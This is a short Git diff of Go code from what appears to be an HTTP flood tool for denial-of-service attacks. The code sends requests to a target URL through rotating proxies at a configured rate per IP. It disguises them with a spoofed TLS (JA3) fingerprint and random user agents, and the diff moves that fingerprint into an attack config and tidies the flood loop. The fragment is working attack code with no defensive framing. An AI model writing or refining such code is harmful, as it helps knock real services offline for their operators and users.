@@ -98,20 +98,18 @@ restart:
 	client := cycletls.Init()
 	options := cycletls.Options{
 		Proxy:     "http://" + proxy,
-		Ja3:       "771,4865-4867-4866-49195-49199-52393-52392-49196-49200-49162-49161-49171-49172-51-57-47-53-10,0-23-65281-10-11-35-16-5-51-43-13-45-28-21,29-23-24-25-256-257,0",
+		Ja3:       Sys.Attack.Ja3,
 		UserAgent: UserAgents[rand.Intn(len(UserAgents))],
 		//Headers:   headers,
 		Timeout: Sys.HTTP2Timeout,
 	}
-	fmt.Println("options set up")
 	if errs == -1 {
 		wg.Done()
 		<-start
 	}
-	fmt.Println("flood  process")
 	for range time.Tick(time.Millisecond * time.Duration(1000.0/Sys.Attack.RequestsPerIP)) {
-		fmt.Println("request")
 		_, err := client.Do(Sys.Attack.Url, options, Sys.Attack.AttackMethod)
+		fmt.Println("request")
 		if err != nil {
 			errs++
 			if errs > 10 {
